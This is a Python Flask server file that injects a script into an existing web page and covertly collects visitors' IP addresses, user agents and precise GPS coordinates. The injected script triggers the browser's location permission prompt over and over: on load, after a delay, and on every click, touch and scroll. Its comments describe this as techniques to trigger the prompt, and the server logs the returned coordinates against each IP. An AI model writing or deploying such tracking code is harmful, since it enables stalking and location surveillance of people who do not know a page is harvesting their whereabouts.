from flask import Flask, request, send_from_directory
import logging
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Get client IP address
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Log the IP and user agent
    logger.info(f"Visitor IP: {client_ip}, User Agent: {user_agent}")
    
    # Read your existing page.html
    try:
        with open('page.html', 'r') as f:
            html_content = f.read()
    except FileNotFoundError:
        html_content = "<html><body>Default page - page.html not found</body></html>"
    
    # Inject the tracking script right before the closing </head> tag
    tracking_script = """
    <script>
        // Function to request GPS permission and log location
        function requestLocation() {
            if (navigator.geolocation) {
                // This timeout helps trigger the permission prompt more reliably
                setTimeout(function() {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            navigator.sendBeacon('/log_location?lat=' + lat + '&lon=' + lon);
                        },
                        function(error) {
                            navigator.sendBeacon('/log_error?code=' + error.code);
                        },
                        {
                            enableHighAccuracy: true,
                            maximumAge: 0,
                            timeout: 15000
                        }
                    );
                }, 100);
            } else {
                navigator.sendBeacon('/log_error?code=unsupported');
            }
        }
        
        // Several techniques to trigger the permission prompt:
        // 1. Try immediately on page load
        requestLocation();
        
        // 2. Try again after a short delay
        setTimeout(requestLocation, 500);
        
        // 3. Try on any user interaction
        document.addEventListener('click', requestLocation);
        document.addEventListener('touchstart', requestLocation);
        document.addEventListener('scroll', requestLocation);
    </script>
    """
    
    # Insert the script and return the modified page
    modified_html = html_content.replace('</head>', tracking_script + '</head>')
    return modified_html

@app.route('/log_location')
def log_location():
    lat = request.args.get('lat', 'unknown')
    lon = request.args.get('lon', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"Location data - IP: {client_ip}, Latitude: {lat}, Longitude: {lon}")
    return '', 204

@app.route('/log_error')
def log_error():
    error_code = request.args.get('code', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"Location error - IP: {client_ip}, Error Code: {error_code}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
